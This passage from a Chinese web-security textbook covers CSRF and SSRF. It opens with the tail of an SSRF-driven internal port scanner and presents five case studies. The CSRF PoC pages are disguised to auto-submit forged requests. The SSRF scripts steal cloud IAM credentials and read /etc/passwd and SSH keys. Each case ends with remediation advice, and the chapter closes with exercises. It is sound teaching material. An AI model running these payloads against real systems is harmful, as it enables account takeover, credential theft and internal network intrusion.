            ports = [21, 22, 80, 443, 3306, 6379, 8080, 8443, 27017]
        
        print(f"[*] 扫描主机端口: {ip}")
        
        open_ports = []
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            results = executor.map(lambda p: self.scan_port(ip, p), ports)
            
            for result in results:
                if result:
                    open_ports.append(result)
                    if result['status'] == 'open':
                        print(f"[+] 端口 {result['port']} 开放")
                        if result.get('banner'):
                            print(f"    Banner: {result['banner']}")
        
        return open_ports
    
    def generate_report(self, filename='internal_report.json'):
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(self.results, f, indent=2, ensure_ascii=False)
        
        print(f"[*] 报告已保存: {filename}")

if __name__ == '__main__':
    scanner = InternalScanner(
        'http://target.com/api/fetch',
        'url'
    )
    
    networks = ['10.0.0.', '192.168.1.', '172.16.0.']
    for network in networks:
        scanner.scan_network(network)
    
    scanner.generate_report()
```

## 8.15 真实案例

### 8.15.1 案例一：某电商平台CSRF漏洞

**漏洞描述**

某电商平台用户资料修改功能存在CSRF漏洞，攻击者可以诱导用户修改个人信息、绑定攻击者的手机号。

**漏洞发现过程**

```text
1. 信息收集阶段：
   - 目标网站：shop.example.com
   - 发现修改手机号功能：POST /api/user/bind-phone
   - 参数：phone, code
   
2. 漏洞检测阶段：
   - 抓取修改手机号请求
   - 分析请求结构
   - 发现没有CSRF Token
   - 发现没有Referer验证
   
3. 漏洞验证阶段：
   - 构造PoC页面
   - 测试修改手机号功能
   - 成功将用户手机号修改为攻击者控制的号码
   
4. 漏洞利用阶段：
   - 构造恶意页面，诱导用户访问
   - 用户登录状态下访问恶意页面
   - 用户手机号被修改为攻击者控制的号码
   - 攻击者通过短信验证码重置用户密码
```

**PoC构造**

```html
<!DOCTYPE html>
<html>
<head>
    <title>账户安全提醒</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
        }
        .container {
            text-align: center;
            padding: 40px;
            background: rgba(0,0,0,0.5);
            border-radius: 20px;
        }
        .btn {
            background: #fff;
            color: #667eea;
            padding: 15px 40px;
            border: none;
            border-radius: 30px;
            font-size: 18px;
            cursor: pointer;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔒 账户安全提醒</h1>
        <p>检测到您的账户存在安全风险，请点击下方按钮验证身份</p>
        <button class="btn" onclick="submitForm()">立即验证</button>
    </div>
    
    <form id="csrf_form" action="https://shop.example.com/api/user/bind-phone" method="POST">
        <input type="hidden" name="phone" value="13800138000">
        <input type="hidden" name="code" value="123456">
    </form>
    
    <script>
        function submitForm() {
            document.getElementById('csrf_form').submit();
        }
        
        window.onload = function() {
            setTimeout(submitForm, 2000);
        };
    </script>
</body>
</html>
```

**漏洞分析**

```php
<?php
$phone = $_POST['phone'];
$code = $_POST['code'];

if (validate_sms_code($code)) {
    update_user_phone($phone);
    return '手机号修改成功';
}
?>
```

**修复建议**

1. 添加CSRF Token验证
2. 验证Referer头
3. 验证验证码与手机号的绑定关系
4. 设置SameSite Cookie属性

### 8.15.2 案例二：某社交平台CSRF漏洞

**漏洞描述**

某社交平台关注功能存在CSRF漏洞，攻击者可以诱导用户自动关注攻击者账号、转发恶意内容。

**漏洞发现过程**

```text
1. 信息收集阶段：
   - 目标网站：social.example.com
   - 发现关注功能：GET /api/follow?user_id=xxx
   - 发现转发功能：POST /api/retweet?id=xxx
   
2. 漏洞检测阶段：
   - 关注请求使用GET方式
   - 转发请求没有CSRF Token
   
3. 漏洞验证阶段：
   - 使用img标签触发关注请求
   - 使用表单触发转发请求
   - 成功实现自动关注和转发
   
4. 漏洞利用阶段：
   - 构造恶意页面
   - 诱导大量用户访问
   - 实现大规模蠕虫传播
```

**PoC构造**

```html
<!DOCTYPE html>
<html>
<head>
    <title>热门话题</title>
</head>
<body>
    <h1>🔥 热门话题：快来围观！</h1>
    
    <img src="https://social.example.com/api/follow?user_id=attacker_id" 
         style="display:none" 
         onerror="this.onerror=null; this.src=''" />
    
    <form id="retweet_form" action="https://social.example.com/api/retweet" method="POST">
        <input type="hidden" name="id" value="malicious_post_id">
        <input type="hidden" name="content" value="这是恶意内容，请不要相信">
    </form>
    
    <script>
        document.getElementById('retweet_form').submit();
    </script>
</body>
</html>
```

**修复建议**

1. 关注功能改为POST请求
2. 添加CSRF Token验证
3. 敏感操作添加验证码

### 8.15.3 案例三：某云平台SSRF漏洞

**漏洞描述**

某云平台图片处理功能存在SSRF漏洞，攻击者可以访问内网资源、获取云服务元数据、攻击内网Redis服务。

**漏洞发现过程**

```text
1. 信息收集阶段：
   - 目标网站：cloud.example.com
   - 发现图片处理功能：/api/image/process?url=http://example.com/image.jpg
   
2. 漏洞检测阶段：
   - 测试基础Payload：http://127.0.0.1
   - 成功返回本地页面内容
   - 测试云元数据：http://169.254.169.254/latest/meta-data/
   - 成功获取IAM角色列表
   
3. 内网探测阶段：
   - 扫描内网存活主机
   - 发现内网Redis服务（192.168.1.100:6379）
   
4. 漏洞利用阶段：
   - 获取IAM临时凭证
   - 利用Redis写入WebShell
   - 获取服务器权限
```

**PoC构造**

```python
import requests
import urllib.parse

def exploit_ssrf():
    base_url = 'https://cloud.example.com/api/image/process'
    
    metadata_url = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
    target = f"{base_url}?url={urllib.parse.quote(metadata_url)}"
    response = requests.get(target)
    print(f"IAM角色列表: {response.text}")
    
    role_name = response.text.strip()
    creds_url = f'http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}'
    target = f"{base_url}?url={urllib.parse.quote(creds_url)}"
    response = requests.get(target)
    credentials = response.json()
    print(f"临时凭证: {credentials}")
    
    redis_url = 'dict://192.168.1.100:6379/info'
    target = f"{base_url}?url={urllib.parse.quote(redis_url)}"
    response = requests.get(target)
    print(f"Redis信息: {response.text[:200]}")

exploit_ssrf()
```

**修复建议**

1. 输入验证：禁止访问内网IP和云元数据地址
2. 协议白名单：只允许http/https协议
3. DNS解析验证：验证解析结果不包含内网IP
4. 网络隔离：限制服务器访问内网资源

### 8.15.4 案例四：某企业内网SSRF漏洞

**漏洞描述**

某企业内网系统存在SSRF漏洞，攻击者可以通过此漏洞扫描内网、访问内网数据库、获取敏感配置信息。

**漏洞发现过程**

```text
1. 信息收集阶段：
   - 目标网站：internal.company.com
   - 发现URL预览功能：/api/preview?url=http://example.com
   
2. 漏洞检测阶段：
   - 测试基础Payload
   - 成功访问内网资源
   
3. 内网扫描阶段：
   - 扫描内网网段 10.0.0.0/24
   - 发现内网MySQL（10.0.0.5:3306）
   - 发现内网MongoDB（10.0.0.6:27017）
   - 发现内网配置服务器（10.0.0.10:8080）
   
4. 漏洞利用阶段：
   - 访问配置服务器获取数据库密码
   - 访问MySQL获取敏感数据
   - 获取企业内部系统权限
```

**PoC构造**

```python
import requests
import urllib.parse

def exploit_internal_ssrf():
    base_url = 'https://internal.company.com/api/preview'
    
    for i in range(1, 255):
        ip = f'10.0.0.{i}'
        url = f'http://{ip}'
        target = f"{base_url}?url={urllib.parse.quote(url)}"
        
        try:
            response = requests.get(target, timeout=3)
            
            if response.status_code == 200 and len(response.text) > 0:
                print(f"[+] 发现主机: {ip}")
                
                if 'MySQL' in response.text:
                    print(f"    服务: MySQL")
                elif 'MongoDB' in response.text:
                    print(f"    服务: MongoDB")
                elif 'config' in response.text.lower():
                    print(f"    服务: 配置服务器")
                    print(f"    内容: {response.text[:200]}")
                    
        except:
            pass
```

**修复建议**

1. 实现严格的输入验证
2. 使用内网IP黑名单
3. 实现网络访问控制列表（ACL）
4. 日志记录所有SSRF尝试

### 8.15.5 案例五：某在线文档平台SSRF漏洞

**漏洞描述**

某在线文档平台PDF生成功能存在SSRF漏洞，攻击者可以利用此漏洞访问本地文件、内网服务。

**漏洞发现过程**

```text
1. 信息收集阶段：
   - 目标网站：docs.example.com
   - 发现PDF生成功能：/api/pdf/generate?url=http://example.com/document.html
   
2. 漏洞检测阶段：
   - 测试file://协议
   - 成功读取/etc/passwd
   - 测试内网访问
   - 成功访问内网服务
   
3. 漏洞利用阶段：
   - 读取敏感配置文件
   - 访问内网数据库
   - 获取管理员凭证
```

**PoC构造**

```python
import requests
import urllib.parse

def exploit_pdf_ssrf():
    base_url = 'https://docs.example.com/api/pdf/generate'
    
    file_urls = [
        'file:///etc/passwd',
        'file:///etc/hosts',
        'file:///var/www/html/config.php',
        'file:///home/user/.ssh/id_rsa',
    ]
    
    for file_url in file_urls:
        target = f"{base_url}?url={urllib.parse.quote(file_url)}"
        
        try:
            response = requests.get(target)
            
            if response.status_code == 200 and len(response.content) > 0:
                print(f"[+] 成功读取: {file_url}")
                
                filename = file_url.replace('file://', '').replace('/', '_')
                with open(filename, 'wb') as f:
                    f.write(response.content)
                print(f"    已保存为: {filename}")
                
        except Exception as e:
            print(f"[-] 读取失败: {file_url}")

exploit_pdf_ssrf()
```

**修复建议**

1. 禁止file://协议
2. 实现URL白名单验证
3. 验证DNS解析结果
4. 添加文件路径过滤

## 8.16 本章小结

### 8.16.1 CSRF漏洞要点

**核心概念**
- CSRF是跨站请求伪造，利用用户已认证的身份执行非预期操作
- CSRF依赖用户已登录，浏览器自动携带Cookie
- CSRF攻击不需要获取用户Cookie，只需诱导用户访问恶意页面

**检测方法**
- 检查敏感操作是否包含CSRF Token
- 检查是否验证Referer头
- 检查Cookie是否设置SameSite属性
- 构造PoC页面验证漏洞

**防护措施**
- 实现CSRF Token机制
- 设置SameSite Cookie属性
- 验证Referer头
- 关键操作添加验证码

### 8.16.2 SSRF漏洞要点

**核心概念**
- SSRF是服务器端请求伪造，利用服务器发起请求的功能
- SSRF可以访问内网资源、云元数据、本地文件
- SSRF危害极大，可能导致内网渗透、数据泄露、RCE

**检测方法**
- 使用基础Payload测试（127.0.0.1, localhost等）
- 使用DNSLog检测带外SSRF
- 测试各种协议支持（http, https, file, dict, gopher等）
- 尝试访问云元数据服务

**防护措施**
- 输入验证：禁止访问内网IP
- 协议白名单：只允许http/https协议
- DNS解析验证：验证解析结果
- 网络隔离：限制服务器访问内网

### 8.16.3 关键对比

| 特征 | CSRF | SSRF |
|-----|------|------|
| 攻击者 | 用户浏览器 | 服务器 |
| 请求发起方 | 用户浏览器 | 服务器 |
| 攻击目标 | 用户的操作权限 | 内网资源 |
| 利用条件 | 用户已登录 | 服务器请求功能 |
| 危害程度 | 中-高 | 高-严重 |
| 防护重点 | Token/Referer/SameSite | 输入验证/网络隔离 |

## 8.17 思考题

1. CSRF攻击的核心原理是什么？与XSS有什么区别？

2. 如何构造JSON CSRF攻击？需要注意什么？

3. SameSite Cookie属性有哪些值？各自的防护效果如何？

4. SSRF漏洞可能导致哪些危害？请按严重程度排序。

5. 如何绕过SSRF防护？请列举至少5种方法。

6. 云元数据服务有哪些？如何通过SSRF访问？

7. 如何利用SSRF攻击Redis服务？请写出完整的攻击步骤。

8. 如何搭建CSRF利用平台？平台应包含哪些功能模块？

9. 请编写一个SSRF扫描器，包含至少20个测试Payload。

10. 如果发现某平台存在SSRF漏洞，你会如何进行深入挖掘？

---

**参考资料**

1. OWASP CSRF Prevention Cheat Sheet
2. OWASP SSRF Prevention Cheat Sheet
3. PortSwigger Web Security Academy - CSRF
4. PortSwigger Web Security Academy - SSRF
5. AWS EC2 Instance Metadata Service
6. Google Cloud Metadata Server
7. Azure Instance Metadata Service
8. Redis Security Documentation
9. Gopher Protocol RFC
10. 《Web安全深度剖析》